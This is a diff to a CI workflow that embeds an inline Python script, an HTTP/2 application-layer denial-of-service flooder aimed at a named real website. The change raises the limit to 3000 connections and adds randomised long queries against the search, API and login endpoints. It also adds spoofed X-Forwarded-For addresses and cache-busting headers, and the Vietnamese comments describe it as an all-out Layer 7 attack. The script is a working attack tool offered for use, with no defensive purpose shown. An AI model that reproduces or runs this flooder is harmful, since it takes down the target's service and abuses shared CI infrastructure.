@@ -1,37 +1,39 @@
-    steps:
-      - name: Install Dependencies
-        run: pip install "httpx[http2]" nest_asyncio
-
-      - name: Execute
+      - name: Execute Max Impact
         run: |
           python3 -c "
           import asyncio, httpx, random, nest_asyncio
           nest_asyncio.apply()
           
           URL = 'https://sangdev.onrender.com/'
-          FILES = ['assets/css/style.css', 'assets/js/main.js', 'login', 'search?q=exploit']
           
           async def start():
-              limits = httpx.Limits(max_connections=2000, max_keepalive_connections=1000)
+              # Tăng số lượng kết nối tối đa
+              limits = httpx.Limits(max_connections=3000, max_keepalive_connections=1500)
               async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
                   while True:
+                      # Tạo chuỗi ngẫu nhiên dài để ép server xử lý tìm kiếm/logic
+                      random_query = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50))
+                      # Tấn công vào các đường dẫn yêu cầu Backend xử lý
+                      targets = [
+                          f'{URL}search?q={random_query}', 
+                          f'{URL}api/check?id={random_query}',
+                          f'{URL}login?redirect={random_query}'
+                      ]
+                      
                       fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                       headers = {
                           'X-Forwarded-For': fake_ip,
-                          'X-Real-IP': fake_ip,
-                          'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}',
-                          'Cache-Control': 'no-cache'
+                          'User-Agent': f'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) {random_query}',
+                          'Cache-Control': 'no-cache, no-store, must-revalidate', # Ép server KHÔNG được dùng cache
+                          'Pragma': 'no-cache'
                       }
-                      target = URL + random.choice(FILES)
+                      
                       try:
-                          # Gửi request và không đợi tải hết nội dung để tối ưu tốc độ
-                          await client.get(target, headers=headers, timeout=0.8)
-                      except Exception:
+                          # Gửi đồng thời 5 request mỗi vòng lặp
+                          await asyncio.gather(*[client.get(t, headers=headers, timeout=0.5) for t in targets])
+                      except:
                           pass
           
-          print('🔥 Node đang hoạt động với HTTP/2...')
-          try:
-              asyncio.run(start())
-          except KeyboardInterrupt:
-              pass
+          print('🔥 Đang tổng lực tấn công vào tầng xử lý (Layer 7)...')
+          asyncio.run(start())
           "
